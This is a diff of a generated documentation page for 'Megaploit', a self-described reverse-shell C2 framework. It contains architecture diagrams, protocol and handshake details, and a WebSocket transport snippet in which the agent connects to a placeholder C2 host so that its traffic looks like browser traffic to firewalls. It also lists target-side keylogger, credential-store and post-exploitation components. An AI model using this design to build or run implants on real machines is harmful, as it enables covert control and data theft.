@@ -80,7 +80,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#megaploit-architecture-guide" class="md-skip">
+        <a href="#megaploit-architecture" class="md-skip">
           Skip to content
         </a>
       
@@ -573,10 +573,10 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#overview" class="md-nav__link">
+  <a href="#high-level-architecture" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Overview
+        High-Level Architecture
       
     </span>
   </a>
@@ -584,181 +584,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#component-deep-dives" class="md-nav__link">
+  <a href="#directory-layout" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Component Deep-Dives
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Component Deep-Dives">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#megaploitcoreprotocolpy-transport-v2-websocket" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        megaploit/core/protocol.py — Transport v2 + WebSocket
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#wstransport-rfc-6455-websocket-layer-new-v3" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        WsTransport — RFC 6455 WebSocket Layer (NEW v3)
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#megaploitserverlistenerpy-connection-lifecycle" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        megaploit/server/listener.py — Connection Lifecycle
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#megaploitserversessionpy-session-dataclass" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        megaploit/server/session.py — Session Dataclass
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#megaploitservercommandspy-command-registry" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        megaploit/server/commands.py — Command Registry
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#megaploitmodulesbasepy-module-lifecycle" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        megaploit/modules/base.py — Module Lifecycle
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#agentmodule-session-bound-post-module-base-new-v3" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        AgentModule — Session-Bound Post Module Base (NEW v3)
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#megaploitcorepipelinepy-post-exploitation-pipeline-new-v3" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        megaploit/core/pipeline.py — Post-Exploitation Pipeline (NEW v3)
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#megaploitcoreprofilepy-malleable-c2-profile-new-v3" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        megaploit/core/profile.py — Malleable C2 Profile (NEW v3)
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#megaploitpayloadbuilderpy-build-pipeline" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        megaploit/payload/builder.py — Build Pipeline
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#megaploitwebapppy-web-dashboard-architecture" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        megaploit/web/app.py — Web Dashboard Architecture
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#megaploitwebrpcpy-multi-operator-rpc-architecture" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        megaploit/web/rpc.py — Multi-Operator RPC Architecture
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#megaploitcoreautorunpy-autorunscript" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        megaploit/core/autorun.py — AutoRunScript
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#megaploitdbdatabasepy-sqlite-engine" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        megaploit/db/database.py — SQLite Engine
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#thread-safety" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Thread Safety
+        Directory Layout
       
     </span>
   </a>
@@ -766,10 +595,109 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#file-layout-key-paths" class="md-nav__link">
+  <a href="#wire-protocol" class="md-nav__link">
     <span class="md-ellipsis">
       
-        File Layout — Key Paths
+        Wire Protocol
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#transport-layers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Transport Layers
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#authentication-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Authentication Flow
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#session-lifecycle" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Session Lifecycle
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#command-dispatch" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Command Dispatch
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#agent-side-architecture" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Agent-Side Architecture
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#loot-organization" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Loot Organization
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#plugin-system-architecture" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Plugin System Architecture
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#module-registry-auto-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Module Registry Auto-Discovery
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#database-schema" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Database Schema
       
     </span>
   </a>
@@ -1047,378 +975,342 @@
   
 
 
-<h1 id="megaploit-architecture-guide">Megaploit Architecture Guide<a class="headerlink" href="#megaploit-architecture-guide" title="Permanent link">&para;</a></h1>
-<h2 id="overview">Overview<a class="headerlink" href="#overview" title="Permanent link">&para;</a></h2>
-<p>Megaploit is a reverse-shell C2 framework. The <strong>server</strong> runs on the operator machine; the <strong>agent</strong> runs on the target. Communication flows over a persistent TCP connection initiated by the agent (no inbound firewall rule needed on the target).</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>Operator Machine                      Target Machine
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>┌─────────────────────────────┐       ┌──────────────────────┐
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>│  server.py                  │       │  agent.py / agent_go │
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>│  ├── Console (cli.py)       │◄──────│  ├── connection.py   │
-</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>│  ├── Listener               │TCP/WS │  ├── handlers.py     │
-</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>│  ├── Sessions               │AES-GCM│  ├── keylogger.py    │
-</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>│  ├── Pipeline               │       │  └── shell.py        │
-</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>│  ├── Module Registry        │       └──────────────────────┘
-</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>│  ├── Payload Builder        │
-</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>│  ├── C2 Profile             │
-</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>│  ├── Web Dashboard          │
-</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>│  └── RPC Server             │
-</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>└─────────────────────────────┘
+<h1 id="megaploit-architecture">Megaploit Architecture<a class="headerlink" href="#megaploit-architecture" title="Permanent link">&para;</a></h1>
+<p>Technical overview of how Megaploit works internally.</p>
+<hr />
+<h2 id="high-level-architecture">High-Level Architecture<a class="headerlink" href="#high-level-architecture" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>┌─────────────────────────────────────────────────────────────┐
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>│                      OPERATOR MACHINE                       │
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>│                                                             │
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>│  server.py                                                  │
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>│  ┌──────────────────────────────────────────────────────┐  │
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>│  │  Console (cli.py)                                    │  │
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>│  │    ├── Global prompt — sessions, modules, payloads   │  │
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>│  │    └── Session prompt — 135 commands dispatched      │  │
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>│  │                                                       │  │
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>│  │  Listener (listener.py)                              │  │
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>│  │    ├── TCP accept loop (background thread)           │  │
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>│  │    ├── HMAC-SHA256 authentication                    │  │
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>│  │    ├── Rate limiter                                  │  │
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>│  │    └── IP allowlist                                  │  │
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>│  │                                                       │  │
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>│  │  Session (session.py)                                │  │
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>│  │    ├── Connection socket                             │  │
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>│  │    ├── Loot paths                                    │  │
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>│  │    └── Metadata (IP, OS, hostname, tag, uptime)     │  │
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>│  └──────────────────────────────────────────────────────┘  │
+</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>│                                                             │
+</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>│  Module Registry — auto-discovers modules in modules/       │
+</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>│  Payload Builder — 14 formats + 12 encoders                │
+</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>│  Toolbox — 200+ tool installer                             │
+</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>│  Plugin System — TOML hot-reload                           │
+</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>│  Credential Store — SQLite                                 │
+</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a>│  Loot Directory — files + audit log                        │
+</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a>└─────────────────────────────────────────────────────────────┘
+</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a>          │                 ▲
+</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>          │  AES-256-GCM    │  length-prefixed
+</span><span id="__span-0-31"><a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a>          │  HMAC-SHA256    │  frames
+</span><span id="__span-0-32"><a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a>          ▼                 │
+</span><span id="__span-0-33"><a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a>┌─────────────────────────────────────────────────────────────┐
+</span><span id="__span-0-34"><a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a>│                      TARGET MACHINE                         │
+</span><span id="__span-0-35"><a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a>│                                                             │
+</span><span id="__span-0-36"><a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a>│  agent.py  ─── connection.py (connect-back loop)           │
+</span><span id="__span-0-37"><a id="__codelineno-0-37" name="__codelineno-0-37" href="#__codelineno-0-37"></a>│                ├── HMAC-SHA256 authentication               │
+</span><span id="__span-0-38"><a id="__codelineno-0-38" name="__codelineno-0-38" href="#__codelineno-0-38"></a>│                ├── AES-256-GCM transport                   │
+</span><span id="__span-0-39"><a id="__codelineno-0-39" name="__codelineno-0-39" href="#__codelineno-0-39"></a>│                └── Auto-reconnect with jitter               │
+</span><span id="__span-0-40"><a id="__codelineno-0-40" name="__codelineno-0-40" href="#__codelineno-0-40"></a>│                                                             │
+</span><span id="__span-0-41"><a id="__codelineno-0-41" name="__codelineno-0-41" href="#__codelineno-0-41"></a>│  shell.py ─── recv → dispatch → respond loop               │
+</span><span id="__span-0-42"><a id="__codelineno-0-42" name="__codelineno-0-42" href="#__codelineno-0-42"></a>│                                                             │
+</span><span id="__span-0-43"><a id="__codelineno-0-43" name="__codelineno-0-43" href="#__codelineno-0-43"></a>│  handlers.py ─── 90+ victim-side handlers                  │
+</span><span id="__span-0-44"><a id="__codelineno-0-44" name="__codelineno-0-44" href="#__codelineno-0-44"></a>│  meterp.py   ─── 16 advanced post-exploitation handlers    │
+</span><span id="__span-0-45"><a id="__codelineno-0-45" name="__codelineno-0-45" href="#__codelineno-0-45"></a>│  keylogger.py                                              │
+</span><span id="__span-0-46"><a id="__codelineno-0-46" name="__codelineno-0-46" href="#__codelineno-0-46"></a>└─────────────────────────────────────────────────────────────┘
 </span></code></pre></div>
 <hr />
-<h2 id="component-deep-dives">Component Deep-Dives<a class="headerlink" href="#component-deep-dives" title="Permanent link">&para;</a></h2>
-<h3 id="megaploitcoreprotocolpy-transport-v2-websocket"><code>megaploit/core/protocol.py</code> — Transport v2 + WebSocket<a class="headerlink" href="#megaploitcoreprotocolpy-transport-v2-websocket" title="Permanent link">&para;</a></h3>
-<p>The protocol operates in two layers:</p>
-<p><strong>Layer 1 — Framing</strong>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>[ uint32 length (4 bytes, big-endian) ][ payload bytes ]
-</span></code></pre></div>
-<code>struct.pack("!I", len)</code> — no sentinel, binary-safe.</p>
-<p><strong>Layer 2 — Encryption</strong></p>
-<p>When <code>cryptography</code> is installed:
-- <code>send_msg(conn, data)</code> → encrypts <code>data</code> with AES-256-GCM (random 12-byte IV), prepends sequence number, frames with length prefix
-- <code>recv_msg(conn)</code> → reads length, decrypts, validates sequence number (rejects replays)</p>
-<p>When <code>cryptography</code> is absent:
-- XOR-CTR fallback with per-session random key</p>
-<p><strong>Handshake sequence</strong> (<code>handshake_server</code> / <code>handshake_agent</code>):
-1. HMAC challenge-response (in <code>crypto.py</code>)
-2. Protocol version byte exchange (<code>0x02</code>)
-3. AES session key generation and exchange</p>
-<p><strong>State management</strong>: <code>get_state(conn_fd)</code> / <code>set_state(conn_fd, state)</code> / <code>remove_state(conn_fd)</code> — keeps per-connection cipher state in a module-level dict, thread-safe with <code>threading.Lock</code>.</p>
-<hr />
-<h3 id="wstransport-rfc-6455-websocket-layer-new-v3"><code>WsTransport</code> — RFC 6455 WebSocket Layer (NEW v3)<a class="headerlink" href="#wstransport-rfc-6455-websocket-layer-new-v3" title="Permanent link">&para;</a></h3>
-<p><code>WsTransport</code> wraps a raw TCP socket with a full WebSocket handshake and binary frame protocol. This allows agents to communicate over port 80/443 while appearing as browser traffic to perimeter firewalls.</p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">megaploit.core.protocol</span><span class="w"> </span><span class="kn">import</span> <span class="n">WsTransport</span>
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="c1"># Server side</span>
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="n">ws</span> <span class="o">=</span> <span class="n">WsTransport</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">server_side</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="n">ws</span><span class="o">.</span><span class="n">handshake</span><span class="p">()</span>       <span class="c1"># reads HTTP Upgrade request, sends 101 response</span>
-</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="n">data</span> <span class="o">=</span> <span class="n">ws</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>     <span class="c1"># reads one binary frame</span>
-</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="n">ws</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;data&quot;</span><span class="p">)</span>     <span class="c1"># sends one binary frame (unmasked, server→client)</span>
-</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>
-</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="c1"># Client/agent side</span>
-</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="n">ws</span> <span class="o">=</span> <span class="n">WsTransport</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">server_side</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
-</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="n">ws</span><span class="o">.</span><span class="n">handshake</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&quot;c2.example.com&quot;</span><span class="p">,</span> <span class="n">path</span><span class="o">=</span><span class="s2">&quot;/updates&quot;</span><span class="p">)</span>
-</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="n">ws</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;data&quot;</span><span class="p">)</span>     <span class="c1"># sends masked binary frame (RFC 6455 client requirement)</span>
-</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a><span class="n">data</span> <span class="o">=</span> <span class="n">ws</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
-</span></code></pre></div>
-<p><strong>Frame structure</strong> (RFC 6455 §5.2):
-<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a> 0                   1                   2                   3
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>├─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─┼─────────────────────────────┤
-</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>│F│R│R│R│ opcode  │M│  payload length  │   extended length...    │
-</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>│I│S│S│S│         │a│   (7 or 7+16     │   (0, 16, or 64 bits)   │
-</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>│N│V│V│V│         │s│    or 7+64)      │                         │
-</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>│ │1│2│3│         │k│                  │                         │
-</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>├─────────────────┴─┴──────────────────┴─────────────────────────┤
-</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>│                    masking key (4 bytes, if masked)             │
-</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>├─────────────────────────────────────────────────────────────────┤
-</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>│                       payload data                              │
-</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>└─────────────────────────────────────────────────────────────────┘
-</span></code></pre></div></p>
-<p>Ping/pong frames are handled transparently inside <code>recv()</code>. CLOSE frames raise <code>ConnectionError</code>.</p>
-<hr />
-<h3 id="megaploitserverlistenerpy-connection-lifecycle"><code>megaploit/server/listener.py</code> — Connection Lifecycle<a class="headerlink" href="#megaploitserverlistenerpy-connection-lifecycle" title="Permanent link">&para;</a></h3>
-<p>Five hardening layers per connection (in order):</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>TCP Accept
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>    ↓
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>1. IP Allowlist check    — drop if not in allowed_ips (if configured)
-</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>    ↓
-</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>2. Rate limiter          — sliding window 5 attempts / 60s; auto-ban 300s
-</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>    ↓
-</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>3. TLS upgrade           — wrap socket in SSLContext (if configured)
-</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>    ↓
-</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>4. HMAC auth             — challenge-response, drop on failure
-</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>    ↓
-</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>5. Protocol handshake    — AES-256-GCM setup
-</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>    ↓
-</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>Session created → on_session(session) callback → Console._on_new_session()
-</span></code></pre></div>
-<p>All events written to <code>loot/audit.log</code> with UTC timestamps.</p>
-<hr />
-<h3 id="megaploitserversessionpy-session-dataclass"><code>megaploit/server/session.py</code> — Session Dataclass<a class="headerlink" href="#megaploitserversessionpy-session-dataclass" title="Permanent link">&para;</a></h3>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nd">@dataclass</span>
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="k">class</span><span class="w"> </span><span class="nc">Session</span><span class="p">:</span>
-</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>    <span class="n">conn</span><span class="p">:</span>         <span class="n">socket</span><span class="o">.</span><span class="n">socket</span>
-</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>    <span class="n">ip</span><span class="p">:</span>           <span class="nb">str</span>
-</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>    <span class="n">port</span><span class="p">:</span>         <span class="nb">int</span>
-</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>    <span class="nb">id</span><span class="p">:</span>           <span class="nb">int</span>             <span class="c1"># Sequential, monotonically increasing</span>
-</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>    <span class="n">connected_at</span><span class="p">:</span> <span class="nb">float</span>           <span class="c1"># Unix timestamp</span>
-</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>    <span class="n">tag</span><span class="p">:</span>          <span class="nb">str</span>             <span class="c1"># Operator-set label</span>
-</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>    <span class="n">notes</span><span class="p">:</span>        <span class="nb">list</span><span class="p">[</span><span class="nb">str</span><span class="p">]</span>       <span class="c1"># Operator notes (also synced via RPC)</span>
-</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>    <span class="n">os_name</span><span class="p">:</span>      <span class="nb">str</span>             <span class="c1"># Populated by sysinfo/os_info</span>
-</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>    <span class="n">hostname</span><span class="p">:</span>     <span class="nb">str</span>
-</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>    <span class="n">username</span><span class="p">:</span>     <span class="nb">str</span>
-</span></code></pre></div>
-<p>Helper methods: <code>loot_dir()</code>, <code>screenshot_path()</code>, <code>recording_path()</code>, <code>download_path(name)</code>, <code>uptime</code> (property), <code>to_dict()</code> (used by web API and RPC).</p>
-<hr />
-<h3 id="megaploitservercommandspy-command-registry"><code>megaploit/server/commands.py</code> — Command Registry<a class="headerlink" href="#megaploitservercommandspy-command-registry" title="Permanent link">&para;</a></h3>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="nd">@_cmd</span><span class="p">(</span><span class="s2">&quot;name&quot;</span><span class="p">,</span> <span class="n">usage</span><span class="o">=</span><span class="s2">&quot;...&quot;</span><span class="p">,</span> <span class="n">help_text</span><span class="o">=</span><span class="s2">&quot;...&quot;</span><span class="p">,</span> <span class="n">dangerous</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
